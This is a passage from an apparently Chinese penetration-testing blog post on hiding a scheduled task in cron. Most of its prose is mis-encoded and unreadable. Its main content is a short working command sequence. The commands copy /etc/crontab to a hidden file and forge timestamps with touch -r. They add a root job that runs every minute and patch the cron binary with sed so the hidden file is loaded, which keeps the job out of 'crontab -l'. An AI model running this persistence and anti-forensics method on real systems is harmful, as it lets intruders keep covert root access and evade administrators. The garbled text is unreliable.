---
title: 在cron中添加隐藏计划任务
url: https://guage.cool/cron-hide.html
source: 半块西瓜皮
date: 2025-04-29
fetch_date: 2025-10-06T22:07:30.549741
---

# 在cron中添加隐藏计划任务

[![](/img/avatar.jpg)](/about/)[氓聧聤氓聺聴猫楼驴莽聯聹莽職庐](/)

忙虏隆忙聹聣忙聣戮氓聢掳氓聠聟氓庐鹿茂录聛

忙聹卢忙聳聡莽聸庐氓陆聲

1. [氓聨聼莽聬聠](#%E5%8E%9F%E7%90%86)
2. [氓聭陆盲禄陇](#%E5%91%BD%E4%BB%A4)
3. [盲录聵莽录潞莽聜鹿](#%E4%BC%98%E7%BC%BA%E7%82%B9)
   1. [盲录聵莽聜鹿](#%E4%BC%98%E7%82%B9)
   2. [莽录潞莽聜鹿](#%E7%BC%BA%E7%82%B9)

氓聸聻氓聢掳茅隆露茅聝篓氓聫聜盲赂聨猫庐篓猫庐潞

[![](data:image/png;base64...)](https://github.com/howmp)[![](data:image/png;base64...)](https://weibo.com/howmp)[![](data:image/png;base64...)](https://guage.cool/atom.xml)![](data:image/png;base64...)

[盲赂禄茅隆碌](/)
[忙聳聡莽芦聽](/)[忙赂聴茅聙聫](/categories/%E6%B8%97%E9%80%8F/)

氓聫聭氓赂聝盲潞聨茂录職2025-04-28忙聸麓忙聳掳盲潞聨茂录職2025-04-28

# 氓聹篓cron盲赂颅忙路禄氓聤聽茅職聬猫聴聫猫庐隆氓聢聮盲禄禄氓聤隆

## 氓聨聼莽聬聠

`/etc/crontab`忙聳聡盲禄露忙聵炉莽鲁禄莽禄聼莽潞搂猫庐隆氓聢聮盲禄禄氓聤隆茅聟聧莽陆庐茂录聦氓聡聽盲鹿聨忙虏隆忙聹聣盲潞潞盲驴庐忙聰鹿

氓聫陋茅聹聙猫娄聛盲驴庐忙聰鹿cron莽篓聥氓潞聫氓聤聽猫陆陆`/etc/crontab`莽職聞忙聳聡盲禄露氓聬聧茂录聦氓聧鲁氓聫炉氓庐聻莽聨掳茅職聬猫聰陆猫庐隆氓聢聮盲禄禄氓聤隆

## 氓聭陆盲禄陇

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` cp /etc/crontab /etc/.cronxx touch /etc/.cronxx -r /etc/crontab echo "* * * * * root touch /tmp/fuck.tmp" >> /etc/.cronxx sed -i 's|/etc/crontab|/etc/.cronxx|g' $(which cron || which crond) touch $(which cron || which crond) -r $(which crontab) systemctl restart cron crond ``` |

忙鲁篓忙聞聫茂录職

1. touch莽聰篓盲潞聨盲录陋猫拢聟mtime
2. sed盲赂颅盲驴庐忙聰鹿氓聬聨莽職聞忙聳聡盲禄露氓聬聧茅聲驴氓潞娄氓驴聟茅隆禄氓聮聦`/etc/crontab`忙聳聡盲禄露氓聬聧茅聲驴氓潞娄盲赂聙猫聡麓
3. echo盲赂颅莽職聞`"* * * * * root touch /tmp/fuck.tmp"` 氓掳卤忙聵炉忙路禄氓聤聽茅職聬猫聴聫氓聭陆盲禄陇

## 盲录聵莽录潞莽聜鹿

### 盲录聵莽聜鹿

1. 盲驴庐忙聰鹿莽庐聙氓聧聲忙聴聽茅聹聙氓聙聼氓聤漏氓聟露盲禄聳氓路楼氓聟路
2. `crontab -l`氓聭陆盲禄陇忙聴聽忙鲁聲忙聼楼莽聹聥

### 莽录潞莽聜鹿

1. 忙聴楼氓驴聴盲赂颅盲禄聧莽聞露盲录職忙聹聣猫庐掳氓陆聲

猫庐赂氓聫炉氓聧聫猫庐庐

忙聹卢忙聳聡茅聡聡莽聰篓 [莽陆虏氓聬聧-茅聺聻氓聲聠盲赂職忙聙搂盲陆驴莽聰篓-莽聸赂氓聬聦忙聳鹿氓录聫氓聟卤盲潞芦 4.0 氓聸陆茅聶聟](https://creativecommons.org/licenses/by-nc-sa/4.0/) 猫庐赂氓聫炉氓聧聫猫庐庐茂录聦猫陆卢猫陆陆猫炉路忙鲁篓忙聵聨氓聡潞氓陇聞茫聙聜

猫戮聝忙聳掳忙聳聡莽芦聽

[WinDump-氓聬聨忙赂聴茅聙聫盲驴隆忙聛炉/氓炉聠莽聽聛/氓聡颅猫炉聛忙聰露茅聸聠氓路楼氓聟路](/windump.html)

猫戮聝忙聴漏忙聳聡莽芦聽

[莽聰篓zig氓庐聻莽聨掳莽庐聙忙聵聯donut](/zig-3-donut.html)

氓驴芦忙聺楼氓聫聜盲赂聨猫庐篓猫庐潞氓聬搂~

---

[茅聶聲ICP氓陇聡2021003897氓聫路](https://beian.miit.gov.cn/) | Powered By [hexo](https://hexo.io/) and [Stellar](https://github.com/xaoxuu/hexo-theme-stellar)

忙聹聙猫驴聭忙聸麓忙聳掳

[BeaconKiller茅聮聢氓炉鹿http/https莽職聞beacon莽職聞忙拢聙忙碌聥氓路楼氓聟路](/beaconkiller.html)[WinDump-氓聬聨忙赂聴茅聙聫盲驴隆忙聛炉/氓炉聠莽聽聛/氓聡颅猫炉聛忙聰露茅聸聠氓路楼氓聟路](/windump.html)[氓聹篓cron盲赂颅忙路禄氓聤聽茅職聬猫聴聫猫庐隆氓聢聮盲禄禄氓聤隆](/cron-hide.html)[莽聰篓zig氓庐聻莽聨掳莽庐聙忙聵聯donut](/zig-3-donut.html)[IIS盲赂聥web.config氓聢漏莽聰篓](/iis-web-config.html)

忙聽聡莽颅戮盲潞聭

[BOF](/tags/BOF/) [processhacker](/tags/processhacker/) [氓聫聧莽聢卢](/tags/%E5%8F%8D%E7%88%AC/) [cobaltstrike](/tags/cobaltstrike/) [Donut](/tags/Donut/) [dotnet](/tags/dotnet/) [docker](/tags/docker/) [猫聶職忙聥聼忙聹潞](/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/) [氓聠聟莽陆聭莽漏驴茅聙聫](/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/) [sublime](/tags/sublime/) [ssh](/tags/ssh/) [茅職聬猫聴聫](/tags/%E9%9A%90%E8%97%8F/) [socks5](/tags/socks5/) [MESSAGE\_MAP](/tags/MESSAGE-MAP/) [猫聡麓猫驴聹](/tags/%E8%87%B4%E8%BF%9C/) [report](/tags/report/) [webshell](/tags/webshell/) [bypassav](/tags/bypassav/) [glibc](/tags/glibc/) [password](/tags/password/) [cron](/tags/cron/) [iis](/tags/iis/) [pyoxidizer](/tags/pyoxidizer/) [莽拢聛莽聸聵](/tags/%E7%A3%81%E7%9B%98/) [VSCode](/tags/VSCode/) [盲禄拢莽聽聛氓庐隆猫庐隆](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/) [盲驴隆忙聛炉忙聰露茅聸聠](/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/) [氓聤聽茅聙聼盲鹿聬](/tags/%E5%8A%A0%E9%80%9F%E4%B9%90/) [pty](/tags/pty/) [忙聺聝茅聶聬莽禄麓忙聦聛](/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/) [donut](/tags/donut/) [fakesh](/tags/fakesh/) [忙聨聣莽潞驴](/tags/%E6%8E%89%E7%BA%BF/) [IIS](/tags/IIS/) [COFF](/tags/COFF/) [v8](/tags/v8/) [COM](/tags/COM/) [python](/tags/python/) [beacon](/tags/beacon/) [zig](/tags/zig/) [seeyon](/tags/seeyon/) [aspose](/tags/aspose/) [氓颅聴猫聤聜莽聽聛](/tags/%E5%AD%97%E8%8A%82%E7%A0%81/) [srdi](/tags/srdi/) [jsc](/tags/jsc/) [猫掳聝猫炉聲](/tags/%E8%B0%83%E8%AF%95/) [shellcode](/tags/shellcode/) [PHP](/tags/PHP/) [pyinstaller](/tags/pyinstaller/) [Java](/tags/Java/) [VPN](/tags/VPN/) [node](/tags/node/) [氓聼聼忙聨搂](/tags/%E5%9F%9F%E6%8E%A7/) [盲禄拢莽聬聠](/tags/%E4%BB%A3%E7%90%86/) [openvpn](/tags/openvpn/) [忙聴楼氓驴聴](/tags/%E6%97%A5%E5%BF%97/) [CobaltStrike](/tags/CobaltStrike/) [MFC](/tags/MFC/) [wiz](/tags/wiz/)